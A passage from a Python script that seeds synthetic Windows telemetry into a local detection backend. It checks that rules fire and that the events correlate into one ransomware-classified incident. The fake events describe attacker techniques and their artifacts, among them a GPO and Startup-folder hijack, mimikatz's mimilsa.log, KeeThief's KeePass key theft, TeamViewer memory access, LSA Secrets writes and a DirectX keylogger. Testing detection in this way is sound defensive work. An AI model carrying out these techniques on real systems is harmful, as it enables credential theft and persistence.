                    integrity="System", parent_image=r"C:\Windows\System32\Utilman.exe"))
    ev.append(proc(step(1), G["osk_child"], G["osk_tool"], r"C:\Windows\System32\whoami.exe",
                    "whoami", pid=6230, ppid=6220, user="NT AUTHORITY\\SYSTEM", integrity="System"))

    # A fake pending Group Policy is queued in the registry so the next
    # policy refresh runs an attacker-controlled .inf (SYS-232).
    ev.append(raw_event(13, step(1), Image=r"C:\Windows\regedit.exe", EventType="SetValue",
                         TargetObject=(r"HKU\S-1-5-21-1-2-3-1000\Software\Microsoft\IEAK"
                                       r"\GroupPolicy\PendingGPOs\Path1"),
                         Details=r"c:\programdata\gpo.inf"))

    # The Startup special folder is redirected via User Shell Folders to an
    # attacker-controlled path (SYS-233).
    ev.append(raw_event(13, step(1), Image=r"C:\Windows\System32\reg.exe", EventType="SetValue",
                         TargetObject=(r"HKU\S-1-5-21-1-2-3-1000\Software\Microsoft\Windows"
                                       r"\CurrentVersion\Explorer\User Shell Folders\startup"),
                         Details=r"c:\programdata\StartupNewHomeAddress"))

    # smss.exe -- which runs once at boot, launches a fixed set of known
    # children, and exits -- spawns a shell instead (SYS-234).
    ev.append(proc(step(1), G["smss_boot"], G["root"], r"C:\Windows\System32\smss.exe",
                    r"\SystemRoot\System32\smss.exe", pid=6240, ppid=4, user="NT AUTHORITY\\SYSTEM",
                    integrity="System"))
    ev.append(proc(step(1), G["smss_shell"], G["smss_boot"], r"C:\Windows\System32\cmd.exe",
                    r"c:\windows\system32\cmd.exe", pid=6250, ppid=6240, user="NT AUTHORITY\\SYSTEM",
                    integrity="System"))

    # lsass.exe itself creates mimikatz's memssp default credential-capture
    # log -- close to a direct signature match (SYS-235).
    ev.append(raw_event(11, step(1), Image=r"C:\Windows\system32\lsass.exe", ProcessGuid=G["lsass"],
                         TargetFilename=r"C:\Windows\System32\mimilsa.log"))

    # KeeThief creates a remote thread inside KeePass to read the unlocked
    # database key straight out of process memory (SYS-236).
    ev.append(proc(step(1), G["keethief_ps"], G["ops"], r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    "powershell.exe -Command Get-KeePassDatabaseKey", pid=6260, ppid=4510))
    ev.append(proc(step(1), G["keepass_proc"], G["root"], r"C:\Program Files\KeePass Password Safe 2\KeePass.exe",
                    '"C:\\Program Files\\KeePass Password Safe 2\\KeePass.exe"', pid=6270, ppid=628))
    ev.append(raw_event(8, step(1), SourceImage=r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                         SourceProcessGUID=G["keethief_ps"],
                         TargetImage=r"C:\Program Files\KeePass Password Safe 2\KeePass.exe",
                         TargetProcessGUID=G["keepass_proc"], User=USER))

    # A process outside TeamViewer's own components opens a handle into its
    # memory, the same primitive public "TeamViewer dumper" tooling uses
    # (SYS-237).
    ev.append(proc(step(1), G["frida_helper"], G["ops"],
                    r"C:\Users\redteam.ops\AppData\Local\Temp\frida-winjector-helper-32.exe",
                    "frida-winjector-helper-32.exe", pid=6280, ppid=4510))
    ev.append(proc(step(1), G["teamviewer_proc"], G["root"], r"C:\Program Files (x86)\TeamViewer\TeamViewer.exe",
                    '"C:\\Program Files (x86)\\TeamViewer\\TeamViewer.exe"', pid=6290, ppid=628))
    ev.append(raw_event(10, step(1),
                         SourceImage=r"C:\Users\redteam.ops\AppData\Local\Temp\frida-winjector-helper-32.exe",
                         SourceProcessGUID=G["frida_helper"],
                         TargetImage=r"C:\Program Files (x86)\TeamViewer\TeamViewer.exe",
                         TargetProcessGUID=G["teamviewer_proc"], GrantedAccess="0x147a", User=USER))

    # A value is written under LSA Secrets -- every DPAPI-protected secret on
    # the box, including the machine account password (SYS-238).
    ev.append(raw_event(13, step(1), Image=r"C:\Windows\system32\lsass.exe", ProcessGuid=G["lsass"],
                         EventType="SetValue",
                         TargetObject=r"HKLM\SECURITY\Policy\Secrets\$MACHINE.ACC\CurrVal\(Default)",
                         Details="Binary Data"))

    # A DirectX-based keylogger reads raw input through DirectInput rather
    # than the normal message queue, leaving an artifact under
    # MostRecentApplication that most anti-keylogging tools never watch
    # (SYS-239).
    ev.append(proc(step(1), G["keylogger_dx"], G["ops"], r"C:\Users\redteam.ops\Downloads\keylogger_directx.exe",
                    "keylogger_directx.exe", pid=6300, ppid=4510))
    ev.append(raw_event(13, step(1), Image=r"C:\Users\redteam.ops\Downloads\keylogger_directx.exe",
                         ProcessGuid=G["keylogger_dx"], EventType="SetValue",
                         TargetObject=(r"HKU\S-1-5-21-1-2-3-1000\Software\Microsoft\DirectInput"
                                       r"\MostRecentApplication\Name"),
                         Details="KEYLOGGER_DIRECTX.EXE"))

    return ev


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Seed one incident that fires every rule in the corpus."
    )
    parser.add_argument("--url", default="http://localhost:8000/ingest")
    parser.add_argument("--delay", type=float, default=0.05)
    args = parser.parse_args()

    all_events = events()
    print(f"Seeding full-coverage range on {HOST}: {len(all_events)} events\n")

    fired, incident_ids = post_events(all_events, args.url, args.delay)

    print("\nRules fired:")
    for rule_id, count in sorted(fired.items()):
        print(f"  {rule_id:10} x{count}")

    missing = EXPECTED_RULES - set(fired)
    print(f"\n{len(fired)}/{len(EXPECTED_RULES)} rules fired.")
    if missing:
        print(f"Did not fire: {', '.join(sorted(missing))}")
    else:
        print("Every rule in the corpus fired at least once.")

    print(f"Distinct incidents created: {len(incident_ids)} ({', '.join(sorted(incident_ids)) or 'none'})")
    if len(incident_ids) == 1:
        print("Confirmed: everything correlated into a single incident.")
    elif len(incident_ids) > 1:
        print("Warning: the run split across more than one incident.")

    # This incident's rule IDs satisfy all three _CORRELATION_CHAINS patterns
    # at once (SYS-004+SYS-080/081 for ransomware, two-plus of
    # SYS-010/041/130/131 for the credential campaign, SYS-001+SYS-009 for
    # office-to-PowerShell) -- but Incident.classification returns only the
    # first match in chain-priority order, "ransomware", the same
    # first-match-wins rule _NARRATIVES already uses. That is expected, not
    # a bug: it is what the title reports, so this check confirms the
    # highest-priority chain specifically, rather than asserting all three
    # are independently visible on one incident.
    if len(incident_ids) == 1:
        incident_id = next(iter(incident_ids))
        base_url = args.url.rsplit("/ingest", 1)[0]
        try:
            resp = httpx.get(f"{base_url}/incidents/{incident_id}", timeout=10.0)
            resp.raise_for_status()
            inc = resp.json()
        except httpx.HTTPError as exc:
            print(f"\n! could not verify classification: {exc}")
        else:
            classification = inc.get("classification")
            print(f"\nIncident classification: {classification or '(none)'}")
            print(f"Incident title: {inc.get('title')}")
            if classification == "ransomware":
                print("Confirmed: the ransomware correlation chain (highest priority) fired.")
            else:
                print(
                    "Warning: expected classification 'ransomware' (see "
                    "_CORRELATION_CHAINS in backend/models/schemas.py)."
                )

    print(f"\nOpen http://localhost:8000 and expand the {HOST} incident.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
